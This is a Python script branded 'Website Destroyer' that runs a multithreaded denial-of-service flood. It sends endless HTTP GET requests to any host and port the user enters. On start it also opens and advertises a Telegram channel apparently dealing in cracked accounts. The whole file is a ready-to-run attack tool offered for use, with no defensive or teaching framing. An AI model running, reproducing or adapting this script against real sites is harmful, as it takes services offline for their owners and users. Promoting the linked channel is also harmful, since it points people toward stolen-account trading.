import socket
import threading
import webbrowser
import pyfiglet
import subprocess
import time

def open_link(link):
    subprocess.run(['termux-open-url', link])

url_to_open = 'https://t.me/crackedaccns'
banner = pyfiglet.figlet_format("Website Destroyer", font='slant')
print(banner)
join_banner = pyfiglet.figlet_format("First Join @crackedaccns", font='slant')
print(join_banner)

# Open a new browser window pointing to a specific URL
try:
    time.sleep(2)
    open_link(url_to_open)
except Exception as e:
    print(f"An error occurred while opening the link: {e}")
    webbrowser.open('https://t.me/crackedaccns')

# Global counter for the number of requests
num_requests = 0

def perform_dos(target, port, threads):
    print(f"Launching a user-friendly DoS attack on {target}:{port} with {threads} threads. Brace yourself for chaos!")

    def attack():
        global num_requests
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n").encode('ascii'))
                s.close()

                # Increment the counter and print the number of requests
                num_requests += 1
                print(f"Number of requests sent: {num_requests}")

            except Exception as e:
                print(f"An error occurred: {e}")
                pass

    try:
        # Create threads for the attack
        thread_list = []
        for _ in range(threads):
            thread = threading.Thread(target=attack)
            thread_list.append(thread)
            thread.start()

        # Wait for threads to finish
        for t in thread_list:
            t.join()

    except KeyboardInterrupt:
        print("\nUser interrupted the attack. Exiting gracefully.")

if __name__ == "__main__":
    target_host = input("Enter the target host (e.g., example.com): ")
    target_port = int(input("Enter the target port (default is 80): ") or 80)
    num_threads = int(input("Enter the number of threads (e.g., 10): "))
    perform_dos(target_host, target_port, num_threads)
    
